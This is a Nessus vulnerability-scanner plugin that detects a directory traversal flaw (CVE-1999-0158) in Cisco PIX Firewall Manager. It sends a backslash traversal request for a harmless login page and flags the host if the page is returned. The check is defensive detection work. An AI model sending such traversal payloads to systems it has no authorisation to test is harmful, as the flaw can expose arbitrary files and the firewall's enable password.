#
# This script was written by H D Moore <hdmoore@digitaldefense.net>
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (3/30/2009)


include("compat.inc");

if(description)
{
 script_id(10819);
 script_version("$Revision: 1.20 $");

 script_cve_id("CVE-1999-0158");
 script_bugtraq_id(691);
 script_osvdb_id(685);

 script_name(english:"Cisco PIX Firewall Manager (PFM) on Windows Arbitrary File Access");
 script_summary(english:"\..\..\file.txt");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files on the remote host
through the remote web server." );
 script_set_attribute(attribute:"description", value:
"It is possible to read arbitrary files on this machine by using
relative paths in the URL. This flaw can be used to bypass the
management software's password protection and possibly retrieve
the enable password for the Cisco PIX.

This vulnerability has been assigned Cisco Bug ID: CSCdk39378." );
 script_set_attribute(attribute:"solution", value:
"Cisco originally recommended upgrading to version 4.1.6b or version 
4.2, however the same vulnerability has been found in version 4.3. 
Cisco now recommends that you disable the software completely and 
migrate to the new PIX Device Manager software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value:
"2001/12/06");
 script_set_attribute(attribute:"patch_publication_date", value: "1998/09/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "1998/08/31");
 script_cvs_date("$Date: 2011/03/17 17:53:54 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2001-2011 Digital Defense Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8181);
 exit(0);
}
 
#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:8181);
ports = add_port_in_list(list:get_kb_list("Services/www"), port:8080);

foreach port (ports)
{
    req = http_get(item:string("/..\\pixfir~1\\how_to_login.html"), port:port);
    r   = http_keepalive_send_recv(port:port, data:req);
    if(r && "How to login" >< r) security_warning(port);
}
